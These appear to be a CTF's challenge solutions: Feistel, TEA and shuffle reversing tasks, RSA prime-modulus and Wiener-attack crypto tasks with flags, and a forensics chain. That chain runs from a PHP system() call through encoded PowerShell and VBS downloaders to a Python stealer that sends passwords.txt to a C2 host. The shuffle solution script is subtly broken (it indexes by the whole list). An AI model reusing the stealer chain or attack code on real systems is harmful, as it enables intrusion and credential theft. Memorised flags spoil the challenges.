# Feisty

Source:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void roundFunction(char *half, char key) {
    for (int i = 0; i < strlen(half); i++) {
        half[i] ^= key;
    }
}

void feistelEncrypt(const char *plaintext, char *ciphertext, char key1, char key2) {
    int n = strlen(plaintext) / 2;
    char left[n + 1], right[n + 1];


    strncpy(left, plaintext, n);
    left[n] = '\0';
    strncpy(right, plaintext + n, n);
    right[n] = '\0';

    char newLeft[n + 1];
    strcpy(newLeft, right);
    roundFunction(right, key1);
    strcpy(right, left);
    strcpy(left, newLeft);

    strcpy(newLeft, right);
    roundFunction(right, key2);
    strcpy(right, left);
    strcpy(left, newLeft);

    strcpy(ciphertext, left);
    strcat(ciphertext, right);
}

void printHex(const char *str) {
    for (int i = 0; i < strlen(str); i++) {
        printf("%02X", (unsigned char)str[i]);
    }
    printf("\n");
}

int main() {
    const char *plaintext = "ISMCTF{L00k_a7_Y0u_r3V3r51ng_f31stel_N3tw0rk5}"; // replaced with a fake flag in the actual binary
    char key1 = 'K';
    char key2 = 'M';

    char ciphertext[48];
    char decryptedText[48];

    feistelEncrypt(plaintext, ciphertext, key1, key2);
    printf("Ciphertext (hex): ");
    printHex(ciphertext);


    return 0;
}

```

Resulting ciphertext: `49534D4354467B4C30306B5F61375F5930755F723356337235316E675F6633317374656C5F4E33747730726B357D`

Decrypt function:
```C
void feistelDecrypt(const char *ciphertext, char *decryptedText, char key1, char key2) {
    int n = strlen(ciphertext) / 2;
    char left[n + 1], right[n + 1];

    strncpy(left, ciphertext, n);
    left[n] = '\0';
    strncpy(right, ciphertext + n, n);
    right[n] = '\0';

    // Reverse Round 2
    char newRight[n + 1];
    strcpy(newRight, left);
    roundFunction(left, key2);
    strcpy(left, right);
    strcpy(right, newRight);

    // Reverse Round 1
    strcpy(newRight, left);
    roundFunction(left, key1);
    strcpy(left, right);
    strcpy(right, newRight);

    strcpy(decryptedText, left);
    strcat(decryptedText, right);
}
```

FLAG: `ISMCTF{L00k_a7_Y0u_r3V3r51ng_f31stel_N3tw0rk5}`
Compiled without symbols (`gcc -s`).

# Feisty revenge

Recognize custom implementation of TEA (modified DELTA value and rounds). Acknowledge the equivalent keys property of TEA.

Generation code (with the decryption routine - it is removed and the flag is modified in the challenge binary):
```C
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#define DELTA 0x1337BEEF  // Custom delta
#define ROUNDS 40         // Custom rounds

void xor_block(unsigned char* block, uint32_t mask) {
    uint32_t* block_int = (uint32_t*)block;
    *block_int ^= mask;
}

void get_equivalent_keys(unsigned char* key, unsigned char** equivalent_keys) {
    uint32_t mask = 1U << 31;
    
    memcpy(equivalent_keys[0], key, 16);

    memcpy(equivalent_keys[1], key, 16);
    xor_block(equivalent_keys[1] + 8, mask);
    xor_block(equivalent_keys[1] + 12, mask);

    memcpy(equivalent_keys[2], key, 16);
    xor_block(equivalent_keys[2], mask);
    xor_block(equivalent_keys[2] + 4, mask);

    memcpy(equivalent_keys[3], key, 16);
    xor_block(equivalent_keys[3], mask);
    xor_block(equivalent_keys[3] + 4, mask);
    xor_block(equivalent_keys[3] + 8, mask);
    xor_block(equivalent_keys[3] + 12, mask);
}

void encrypt(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0;
    
    for(int i = 0; i < ROUNDS; i++) {
        sum += DELTA;
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }
    
    v[0] = v0;
    v[1] = v1;
}

void decrypt(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = DELTA * ROUNDS;
    
    for(int i = 0; i < ROUNDS; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= DELTA;
    }
    
    v[0] = v0;
    v[1] = v1;
}

unsigned char* encrypt_flag_quarters(const unsigned char* flag, size_t flag_len, unsigned char* key) {
    size_t padded_len = ((flag_len + 7) / 8) * 8;
    size_t quarter_size = ((padded_len + 3) / 4 + 7) / 8 * 8;
    size_t total_size = quarter_size * 4;
    
    unsigned char* padded_flag = calloc(total_size, 1);
    memcpy(padded_flag, flag, flag_len);
    
    unsigned char** equivalent_keys = malloc(4 * sizeof(unsigned char*));
    for(int i = 0; i < 4; i++) {
        equivalent_keys[i] = malloc(16);
    }
    get_equivalent_keys(key, equivalent_keys);
    
    for(size_t i = 0; i < 4; i++) {
        size_t offset = i * quarter_size;
        for(size_t j = 0; j < quarter_size; j += 8) {
            uint32_t* block = (uint32_t*)(padded_flag + offset + j);
            encrypt(block, (uint32_t*)equivalent_keys[i]); // not that it would make a difference which key is used
        }
    }
    
    for(int i = 0; i < 4; i++) {
        free(equivalent_keys[i]);
    }
    free(equivalent_keys);
    
    return padded_flag;
}

unsigned char* decrypt_flag_quarters(const unsigned char* encrypted, size_t total_size, unsigned char* key) {
    unsigned char* decrypted = malloc(total_size);
    memcpy(decrypted, encrypted, total_size);
    
    size_t quarter_size = total_size / 4;
    
    unsigned char** equivalent_keys = malloc(4 * sizeof(unsigned char*));
    for(int i = 0; i < 4; i++) {
        equivalent_keys[i] = malloc(16);
    }
    get_equivalent_keys(key, equivalent_keys);
    
    for(size_t i = 0; i < 4; i++) {
        size_t offset = i * quarter_size;
        for(size_t j = 0; j < quarter_size; j += 8) {
            uint32_t* block = (uint32_t*)(decrypted + offset + j);
            decrypt(block, (uint32_t*)equivalent_keys[i]); // or just key, or any of those keys
        }
    }
    
    for(int i = 0; i < 4; i++) {
        free(equivalent_keys[i]);
    }
    free(equivalent_keys);
    
    return decrypted;
}

void print_hex(const unsigned char* data, size_t len) {
    for(size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

int main() {
    unsigned char key[16] = {
        0xDE, 0xAD, 0xBE, 0xEF,
        0x13, 0x37, 0x73, 0x31,
        0xFE, 0xBE, 0xDA, 0xED,
        0xC3, 0xA8, 0x91, 0xF7
    };
    
    const char* flag = "ISMCTF{P1s_d0_sp177_th3_TEA_s1s}";
    size_t flag_len = strlen(flag);
    
    printf("Original flag: %s\n", flag);
    printf("Flag length: %zu\n", flag_len);

    unsigned char* encrypted = encrypt_flag_quarters((const unsigned char*)flag, flag_len, key);

    size_t quarter_size = (((flag_len + 3) / 4 + 7) / 8 * 8);
    size_t total_size = quarter_size * 4;
    
    printf("\nEncrypted flag (hex): ");
    print_hex(encrypted, total_size);
    
    unsigned char* decrypted = decrypt_flag_quarters(encrypted, total_size, key);
    
    printf("\nDecrypted flag: %s\n", decrypted);

    if(memcmp(flag, decrypted, flag_len) == 0) {
        printf("Encryption/Decryption test passed!\n");
    } else {
        printf("ERROR: Decryption failed!\n");
    }
    
    free(encrypted);
    free(decrypted);
    return 0;
}
```

FLAG: `ISMCTF{P1s_d0_sp177_th3_TEA_s1s}`
Compiled without symbols.

# Forensics

Initial access:
```PHP
<?php system("powershell -e ICggTmVXLU9iakVDdCBzeXN0RU0uaW8uc3RSZWFNckVhZGVSKCggTmVXLU9iakVDdCAgSW8uQ29tcHJFc1NJb04uREVmTGFURVN0UmVhbShbSW8ubWVNb3J5c1RSZUFtXSBbU1lTVGVNLmNvTlZlUlRdOjpmcm9NYkFTRTY0c3RSaU5HKCdOWkJQYTROQUVNWHZnWHlIUlVLM2dicEdZMklRZW14cElTRWhLTDMwWURScnMxVFU2aXFVWmI1N1o5em1NUHZuOFhiZWIvYmgwVEUrbUJVNHpDMzVyZUZQWEJaOHlWRGVrR3kyWUNJd0FaQXJCTE1Hc3dNSHJmcUMxcWJVN0UxV0xSNFBxdWlhbnA1anNhdHNaWDJWZGFIdzlsNlRYbEdwK292aDNnc2grSEkrVzVnaE8xZkFuaWx2ZXcvWWdFV2kxTWlDdFh0cTFHTWV4dUVweHdxRmoydnNlWDRVaUNBU1FVamlPdDZ0dkFrR2J6ZXRpYTI3ZEw5aXpIc2JlVXl6NURRa2xPb3NaRDNHeWN2aDlHbjViUUNtNWZjM3pud21FTTZTQlJPV2I1bnlzL3daYU5wZS80LzlMZDJQYWQ2eHdTOTAwMDZ4YWNJOU1QYzQ2RmRWU1JRYXlrOFRzSTN0NTdzbDQwV25XdXBVSUNmWk12UzFnNFkvJyApICwgW1N5U3RlTS5JTy5DT01QcmVTU0lPTi5jb21QckVTc0lvbk1vREVdOjpEZWNvbVBSZVNzKSApICxbVGVYdC5lbkNvRElOR106OmFTQ0lJKSkuckVhRHRPZW5kKCApfCAmKCAoW3NUUkluR10kVkVSQm9zZXByRUZFUmVOQ2UpWzEsM10rJ3gnLUpPSW4nJyk=") ?>
```

Stage0 unbase64:
```PowerShell
 ( NeW-ObjECt systEM.io.stReaMrEadeR(( NeW-ObjECt  Io.ComprEsSIoN.DEfLaTEStReam([Io.meMorysTReAm] [SYSTeM.coNVeRT]::froMbASE64stRiNG('NZBPa4NAEMXvgXyHRUK3gbpGY2IQemxpISEhKL30YDRrs1TU6iqUZb57Z9zmMPvn8Xbeb/bh0TE+mBU4zC35reFPXBZ8yVDekGy2YCIwAZArBLMGswMHrfqC1qbU7E1WLR4Pquianp5jsatsZX2VdaHw9l6TXlGp+ovh3gsh+HI+W5ghO1fAnilvew/YgEWi1MiCtXtq1GMexuEpxwqFj2vseX4UiCASQUjiOt6tvAkGbzetia27dL9izHsbeUyz5DQklOosZD3Gycvh9Gn5bQCm5fc3znwmEM6SBROWb5nys/wZaNpe/4/9Ld2Pad6xwS90006xacI9MPc46FdVSRQayk8TsI3t57sl40WnWupUICfZMvS1g4Y/' ) , [SySteM.IO.COMPreSSION.comPrESsIonMoDE]::DecomPReSs) ) ,[TeXt.enCoDING]::aSCII)).rEaDtOend( )| &( ([sTRInG]$VERBoseprEFEReNCe)[1,3]+'x'-JOIn'')
```

Stage0 decompressed:
```PowerShell
&("{1}{0}" -f'ho','ec') ("{5}{0}{6}{7}{2}{1}{4}{3}{8}"-f'ta','oft Help','Micros','e',' dependenci','Ins','l','ling ','s...')
${u`Rl} = ("{6}{4}{3}{5}{1}{0}{2}{7}" -f'pLi','softHel','b','4.1','://172.27.24','43:80/Micro','http','rary.vbs')
${OU`TPuT} = "$env:TEMP\MicrosoftHelpLibrary.vbs"
.("{4}{3}{2}{0}{1}" -f'bReque','st','e','ke-W','Invo') -Uri ${u`RL} -OutFile ${oU`TPUT}
.("{1}{0}"-f 'cript','cs') ${o`U`Tput}
```

Stage0 decoded:
```PowerShell
echo "Installing Microsoft Help dependencies..."
$url = "http://172.27.244.143:80/MicrosoftHelpLibrary.vbs"
$output = "$env:TEMP\MicrosoftHelpLibrary.vbs"
Invoke-WebRequest -Uri $url -OutFile $output
cscript $output
```

Stage1:
```VBS
'Microsoft Help Library Installer

Sub aksjdhakjshdw()
    Dim askds, askdsakd
    askds = Tan(79)
    askdsakd = Cos(21)
    askds = Tan(askdsakd) * Sin(30)
End Sub

Dim url, output, objXMLHTTP, objFSO, objFile

Sub plpdinsaid()
    Dim asdas, pldaspl
    pldaspl = Sin(99)
    pldaspl = Cos(pldaspl)
    asdas = 130 * 199 * Tan(pldaspl)
End Sub
'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc mollis 
'nibh urna, sit amet egestas lectus eleifend sed. Pellentesque ornare eu 
'ex a imperdiet. Sed justo enim, aliquet nec sapien at, malesuada interdum nulla. 
'Integer in lacinia justo, nec blandit tortor. Donec ac pretium purus. Nulla nec luctus est. 
'Pellentesque molestie rhoncus velit sit amet gravida. Cras scelerisque magna et nunc mollis sagittis. 
'Aliquam quam purus, egestas sed massa sit amet, fermentum cursus felis. Cras 
'posuere magna sed efficitur lobortis. Mauris dignissim, diam sit amet commodo 
'auctor, dolor nisi sollicitudin lacus, ut rutrum orci nisl vitae turpis.


url = "http://172.27.244.143:80/MicrosoftHelpLibrary.py"
output = "C:\Windows\Temp\MicrosoftHelpLibrary.py"

Sub asdkhaskdjas()
    Dim laskas, pasman
    laskas = Tan(99)
    pasman = Cos(27)
    laskas = Tan(pasman) * Sin(31)
End Sub


aksjdhakjshdw()
aksjdhakjshdw()
aksjdhakjshdw()
asdkhaskdjas()
asdkhaskdjas()
'Donec efficitur mauris tristique nulla interdum, 
'nec tempor velit fringilla. 
'Quisque turpis sem, gravida sit amet consequat at, interdum volutpat 
'sem. Aliquam nec dui accumsan, pharetra odio vitae, mattis nulla. Nunc 
'vehicula tortor quis convallis finibus. Nunc porttitor consectetur imperdiet. Morbi 
'a justo sit amet nunc sodales rhoncus non id tellus. Mauris turpis dolor, 
'fermentum in finibus vitae, euismod id dui.


'Etiam vitae commodo lorem, nec condimentum est. Quisque congue 
'diam a enim hendrerit porttitor. Proin blandit ut leo eget aliquam. Pellentesque ut vestibulum lectus. 
'Mauris sit amet risus eleifend, convallis ex sit amet, euismod velit. Morbi vitae fringilla risus. Morbi nec justo pellentesque, aliquam lacus sit amet, venenatis dui. Donec ornare tellus posuere tincidunt mattis. In sed libero venenatis, auctor urna id, iaculis libero. Maecenas ultrices urna sem, a auctor ante lacinia id. Etiam enim nisi, rutrum eu ligula non, vulputate ultricies dolor. Morbi accumsan, risus in feugiat gravida, risus massa pellentesque tellus, eget placerat sem mauris eget ligula. Vestibulum nec odio enim. In malesuada placerat eros, in auctor nunc aliquet id. Aliquam faucibus elementum imperdiet.






'Donec in ante vel lectus tincidunt molestie. In dignissim accumsan sem at 
'finibus. Aenean eget pulvinar eros, eget imperdiet ipsum. Nam auctor velit commodo erat condimentum 
'elementum. Pellentesque a consequat felis, et fringilla lacus. Orci varius natoque penatibus et magnis dis 
'parturient montes, nascetur ridiculus mus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin dictum 
'tincidunt mollis. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Etiam ut lorem 
'libero. Curabitur mattis sapien vitae iaculis pulvinar. Nunc elit ante, efficitur ac commodo et, imperdiet sit amet nunc. 
'Nullam facilisis neque sit amet semper lacinia. Suspendisse potenti. Donec ut risus diam. Sed non lacus metus.









































































































































































Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(output, True)
    objFile.Write objXMLHTTP.responseText
    objFile.Close
End If

Set objXMLHTTP = Nothing
CreateObject("WScript.Shell").Run "python " & output
```

Stage1 deobfuscated:
```VBS
Dim url, output, objXMLHTTP, objFSO, objFile
url = "http://172.27.244.143:80/MicrosoftHelpLibrary.py"
output = "C:\Windows\Temp\MicrosoftHelpLibrary.py"

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(output, True)
    objFile.Write objXMLHTTP.responseText
    objFile.Close
End If

Set objXMLHTTP = Nothing
CreateObject("WScript.Shell").Run "python " & output
```
Stage2:
```Pyhon
lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI = print, bytes, exit, open, __name__, getattr

from os import urandom as lIIllIIlIllIlI
from requests import post as llIIllllIllIIl
from cryptography.hazmat.primitives.ciphers import Cipher as llIlIIIllIIIII, algorithms as llllllIIIIlIlI, modes as lllllllIIIIIlI
from cryptography.hazmat.backends import default_backend as lIIlIllIllIllI
from cryptography.hazmat.primitives import padding as IlllllIIIIIIIl
from base64 import b64encode as lIllIIIlllIIll
IIllllllIlIlllIlIl = 'http://172.27.244.143:80/c2'

def IlIlIlIIlllIIIIIII():
    IIllIllIIlIlllIlII = lIIllIIlIllIlI(32)
    IIlIlIlIIlIIlIIllI = lIIllIIlIllIlI(16)
    return (IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI)

def IIllIlIlIIlllIlllI(lIIlIllIIIIIIIllIl, IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI):
    lIllIIlllllIllIlII = IlllllIIIIIIIl.PKCS7(128).padder()
    lIlIllllIIIIIIlIII = llllllllllllIlI(lIllIIlllllIllIlII, llllllllllllIlI(llllllllllllllI, 'fromhex')('757064617465').decode())(lIIlIllIIIIIIIllIl) + lIllIIlllllIllIlII.finalize()
    IIIlIlllllIIlIIIlI = llIlIIIllIIIII(llllllIIIIlIlI.AES(IIllIllIIlIlllIlII), lllllllIIIIIlI.CBC(IIlIlIlIIlIIlIIllI), backend=lIIlIllIllIllI())
    IIlllllIIlIIlIIIII = IIIlIlllllIIlIIIlI.encryptor()
    IllIlllIlllIllIlIl = llllllllllllIlI(IIlllllIIlIIlIIIII, llllllllllllIlI(llllllllllllllI, 'fromhex')('757064617465').decode())(lIlIllllIIIIIIlIII) + IIlllllIIlIIlIIIII.finalize()
    return IllIlllIlllIllIlIl

def lllllIIIlIlIllIllI(lIlIIIlllllIlllIll):
    with lllllllllllllII(lIlIIIlllllIlllIll, 'rb') as IIlIlIIllllIIIllIl:
        return llllllllllllIlI(IIlIlIIllllIIIllIl, llllllllllllIlI(llllllllllllllI, 'fromhex')('72656164').decode())()

def lllIlIllllllllIlII(IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI, IllIlllIlllIllIlIl):
    IIllIIlIllIIIlllIl = llllllllllllIlI(lIllIIIlllIIll(IIllIllIIlIlllIlII), llllllllllllIlI(llllllllllllllI, 'fromhex')('6465636f6465').decode())('utf-8')
    llIlIIlIlIlIIIIllI = llllllllllllIlI(lIllIIIlllIIll(IIlIlIlIIlIIlIIllI), llllllllllllIlI(llllllllllllllI, 'fromhex')('6465636f6465').decode())('utf-8')
    IlIIIllllIIlllIlll = llllllllllllIlI(lIllIIIlllIIll(IllIlllIlllIllIlIl), llllllllllllIlI(llllllllllllllI, 'fromhex')('6465636f6465').decode())('utf-8')
    IIIIIlIlIIllIIllII = {'key': IIllIIlIllIIIlllIl, 'iv': llIlIIlIlIlIIIIllI, 'encrypted_data': IlIIIllllIIlllIlll}
    llIIllIllllIlIIlIl = llIIllllIllIIl(IIllllllIlIlllIlIl, data=IIIIIlIlIIllIIllII)

def IIlIllIllllIIIIIll():
    IlIlIlllllIIIllIII = 'C:\\Users\\alek\\Documents\\passwords.txt'
    IlllIlllIlIIIIIlll = lllllIIIlIlIllIllI(IlIlIlllllIIIllIII)
    (IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI) = IlIlIlIIlllIIIIIII()
    lIIIllIlIIIIllIIll = IIllIlIlIIlllIlllI(IlllIlllIlIIIIIlll, IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI)
    lllIlIllllllllIlII(IIllIllIIlIlllIlII, IIlIlIlIIlIIlIIllI, lIIIllIlIIIIllIIll)
if llllllllllllIll == '__main__':
    IIlIllIllllIIIIIll()
    lllllllllllllll('Done')
    lllllllllllllIl(0)
```

Stage2:
```Python
import os
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from base64 import b64encode

C2_URL = 'http://172.27.244.143:80/c2' 

def generate_key_iv():
    key = os.urandom(32)
    iv = os.urandom(16)
    return key, iv

def encrypt_data(data, key, iv):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

def read_secret_file(file_path):
    with open(file_path, 'rb') as f:
        return f.read()

def send_to_c2(key, iv, encrypted_data):
    encoded_key = b64encode(key).decode('utf-8')
    encoded_iv = b64encode(iv).decode('utf-8')
    encoded_encrypted_data = b64encode(encrypted_data).decode('utf-8')
    payload = {
        'key': encoded_key,
        'iv': encoded_iv,
        'encrypted_data': encoded_encrypted_data
    }
    response = requests.post(C2_URL, data=payload)

def main():
    secret_file_path = 'C:\\Users\\alek\\Documents\\passwords.txt'
    secret_data = read_secret_file(secret_file_path)
    key, iv = generate_key_iv()
    encrypted_secret = encrypt_data(secret_data, key, iv)
    send_to_c2(key, iv, encrypted_secret)

if __name__ == '__main__':
    main()
    print("Done")
    exit(0)
```

Flag: `ISMCTF{Gr3at_j0b_Y0U_m4lw4r3_hUUnt3r}`

# Reversing mastery

Reversing a linked list which shuffles the flag characters around. Debugging a core dump to get the shuffled positions.

```C++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/mman.h>

#define FLAGSIZE 68

struct ShuffleList {
    struct ShuffleList* next;
    uint8_t new_pos;
    char chr;
};

bool pos_in_list(struct ShuffleList* l, uint8_t pos) {
    while (l) {
        if (l->new_pos == pos) return true;
        l = l->next;
    }
    return false;
}

void append_list(struct ShuffleList** l, uint8_t pos, char chr) {
    struct ShuffleList* cur = *l;
    if (!cur) {
        cur = malloc(sizeof(struct ShuffleList));
        cur->next = NULL;
        cur->new_pos = pos;
        cur->chr = chr;
        *l = cur;
        return;
    }
    while (cur->next) cur = cur->next;
    cur->next = malloc(sizeof(struct ShuffleList));
    cur->next->next = NULL;
    cur->next->new_pos = pos;
    cur->next->chr = chr;
    return;
}

struct ShuffleList* init_shuffle_list(const char* buf) {
    int r = open("/dev/urandom", O_RDONLY);
    struct ShuffleList* head = NULL;
    int len = 0;
    while (len < FLAGSIZE) {
        uint8_t pos;
        read(r, &pos, sizeof(pos));
        while (pos >= FLAGSIZE || pos_in_list(head, pos)) read(r, &pos, sizeof(pos));
        append_list(&head, pos, buf[len]);
        len += 1;
    }
    close(r);
    return head;
}
void shuf(struct ShuffleList* list, char* buffer) {
    while (list) {
        buffer[list->new_pos] = list->chr;
        list->chr = 0;
        list = list->next;
    }
}

int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <secret file>\n", argc > 0 ? argv[0] : "./program");
        return -1;
    }
    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        perror("Opening file");
        return -1;
    }
    char* buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (!buf) {
        perror("Mapping file");
        return -1;
    }
    memset(buf + FLAGSIZE, 0, 0x1000 - FLAGSIZE);
    struct ShuffleList* list = init_shuffle_list(buf);
    memset(buf, 0, FLAGSIZE);
    shuf(list, buf);
    puts(buf);
    kill(0, SIGSEGV);
}
```

Solution script (once the shuffled list is found):

```Python
shuffled = "1mSppp_0_ppMgpvy_ppr_101pn_3p}p_F_arrpkCl40wI{3a4lpeups_pTppp0pp3rk7"
pos = [0x2C,0x02,0x0B,0x14,0x27,0x39,0x20,0x2D,0x28,0x2A,0x07,0x42,0x06,0x22,0x43,0x1A,0x0F,0x3D,0x34,0x1F,0x24,0x1B,0x0E,0x33,0x13,0x36,0x15,0x19,0x0C,0x10,0x01,0x30,0x17,0x2B,0x29,0x23,0x2E,0x37,0x31,0x00,0x26,0x40,0x21,0x2F,0x08,0x38,0x03,0x1E,0x3C,0x11,0x1C,0x25,0x18,0x3A,0x32,0x0A,0x3F,0x35,0x3B,0x0D,0x09,0x05,0x12,0x04,0x3E,0x41,0x16]
flag = ""
for p in pos:
    flag += shuffled[pos]
print(flag + "}")
```

FLAG:`ISM_CTF{l00k_a7_y0u_r3vers1ng_m41w4r3_l1k3_a_ppppppppppppppppppppr0}`

# How-To-Crypto v1

Prime RSA modulus

Generation script:
```Python
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
import random
from math import gcd

def is_probable_prime(n, k=5):
    # Miller-Rabin
    if n <= 3:
        return n > 1
    if n % 2 == 0:
        return False
        
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
        
    for _ in range(k):
        a = random.randrange(2, n-1)
        x = pow(a, d, n)
        if x == 1 or x == n-1:
            continue
        for _ in range(r-1):
            x = (x * x) % n
            if x == n-1:
                break
        else:
            return False
    return True

def generate_prime_n(bits=2048):
    while True:
        n = random.getrandbits(bits) | 1 # ensure odd
        if n.bit_length() != bits:
            continue
        if is_probable_prime(n):
            return n

def create_simple_rsa_challenge():
    N = generate_prime_n(2048)
    e = 65537
    flag = "ISMCTF{v3ry_w34k_and_PR1m3_m0dul1_443_b4d!_}"
    message = b2l(flag.encode())
    encrypted = pow(message, e, N)
    
    print(f"N = {N}")
    print(f"e = {e}")
    print(f"encrypted = {encrypted}")
    
    d = pow(e, -1, N-1)
    decrypted = pow(encrypted, d, N)
    flag = l2b(decrypted)
    print("\nVerification")
    print(f"Decrypted message: {flag}")

create_simple_rsa_challenge()
```

Parameters given:
```
N = 27125119957548053136019718288271777305255430156093910277293268519141000839369148886811747895984973353476574438862472854766164597926934455485426347624133380145860011592887760913281871369346330458748723190957099237372105633223861420204953158791180581655817728731653541061733141750847543459461857861546990392233891432369227653892982367783432947574576688493883151393937416154970208848092584249831220120223321092141270036852248197159577034116099733174114230642268428413058608407303712976663859778593396323516835621696362093170473179938258124049454635522516270376136530489323679455760809644703362116223393047237403707434311
e = 65537
encrypted = 6830486380891635745596456633952420283443091928187082453500219608256472195190857495136472039266938540301298987854335180586950167209996390888923148439557476361506566181456842843374698723882286761565463360930326475628198536802230789193690346062184105889878885980012592678215971449343526316172958749986340428840075112001293907652257583397457419729590162258152636023744387541248597242257998651773689958058259351993277711359064028610515110472112691080046726853177967277066470655500480745159084439446387294460804816349653409101590185521892033149753953250244726920717449831562727282814055283852431578824139303734546212996259
```

FLAG:`ISMCTF{v3ry_w34k_and_PR1m3_m0dul1_443_b4d!_}`


# How-To-Crypto v2

RSA Wiener attack

Generation script:
```Python
from fractions import Fraction
import math
import random
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b

def generate_wiener_vulnerable_key(bits=1024):
    def generate_prime(bits):
        while True:
            n = random.getrandbits(bits)
            if n % 2 == 0:
                n += 1
            if is_probable_prime(n):
                return n
    
    # Miller-Rabin
    def is_probable_prime(n, k=5):
        if n <= 3:
            return n > 1
        if n % 2 == 0:
            return False
        
        r, s = 0, n - 1
        while s % 2 == 0:
            r += 1
            s //= 2
            
        for _ in range(k):
            a = random.randrange(2, n-1)
            x = pow(a, s, n)
            if x == 1 or x == n-1:
                continue
            for _ in range(r-1):
                x = (x * x) % n
                if x == n-1:
                    break
            else:
                return False
        return True
    
    p = generate_prime(bits//2)
    q = generate_prime(bits//2)
    n = p * q
    phi = (p-1) * (q-1)

    d = random.randrange(2, int(pow(n, 1/4)/3))

    def mod_inverse(d, phi):
        def extended_gcd(a, b):
            if a == 0:
                return b, 0, 1
            gcd, x1, y1 = extended_gcd(b % a, a)
            x = y1 - (b // a) * x1
            y = x1
            return gcd, x, y
        
        gcd, x, _ = extended_gcd(d, phi)
        if gcd != 1:
            raise ValueError("Modular inverse does not exist")
        return x % phi
    
    e = mod_inverse(d, phi)
    
    return (e, n), (d, n), p, q

def continued_fraction_expansion(num, denom):
    coefficients = []
    while denom:
        q = num // denom
        coefficients.append(q)
        num, denom = denom, num - q * denom
    return coefficients

def convergents_from_expansion(expansion):
    n1, n2 = 1, expansion[0]
    d1, d2 = 0, 1
    
    yield (n2, d2)
    
    for i in range(1, len(expansion)):
        n3 = expansion[i] * n2 + n1
        d3 = expansion[i] * d2 + d1
        
        yield (n3, d3)
        
        n1, n2 = n2, n3
        d1, d2 = d2, d3

def is_perfect_square(n):
    root = int(math.isqrt(n))
    return (root * root == n, root)

def wiener_attack(e, n):
    convergents = convergents_from_expansion(continued_fraction_expansion(e, n))
    
    for k, d in convergents:
        if k == 0:
            continue
        phi_n = (e * d - 1) // k
        
        b = n - phi_n + 1
        discriminant = b * b - 4 * n
        
        is_square, root = is_perfect_square(discriminant)
        if not is_square:
            continue

        p = (b + root) // 2
        q = (b - root) // 2
        
        if p * q == n:
            return d
            
    return None

def generate_example_challenge():
    public_key, private_key, p, q = generate_wiener_vulnerable_key()
    e, n = public_key
    real_d = private_key[0]
    flag = "ISMCTF{W0uld_Y0U_l1k3_4_w13n34_w1th_Y0u4_m34l?__}"
    message = b2l(flag.encode())

    ciphertext = pow(message, e, n)
    
    print("Challenge Parameters:")
    print(f"Public modulus (n) = {n}")
    print(f"Public exponent (e) = {e}")
    print(f"Encrypted message = {ciphertext}")

    print("\nAttempting Wiener's attack...")
    recovered_d = wiener_attack(e, n)
    
    if recovered_d:
        print(f"\nAttack succeeded!")
        print(f"Recovered d = {recovered_d}")
        print(f"Real d = {real_d}")

        decrypted = pow(ciphertext, recovered_d, n)
        print(f"Decrypted message: {decrypted}")
        print(f"Original message: {message}")
        
        if decrypted == message:
            print("Successfully decrypted the message!")
            print(l2b(decrypted))
    else:
        print("Attack failed - the private exponent might not be small enough.")

generate_example_challenge()
```

Parameters given:
```
N = 31588324426540442044321824172542211043887571120099077064009862254928132858615818834862399764982563399555520865736869935560816904061167018453903851596761821153495330247353852332794620670364098624075805292315644036069121555758600506862592028295615030395316066118602182461267128539520247001551914226470622024713
e = 4624185877027739803255030988130984968420123098515616875594787525941640049261552489128192199514954945950400811618080766505519830755549330166886411441359520298180515667364704918142716843781189921889774543792787892901214180364410286917639121582831259233050777600953991304197202596834820656935144965288429433743
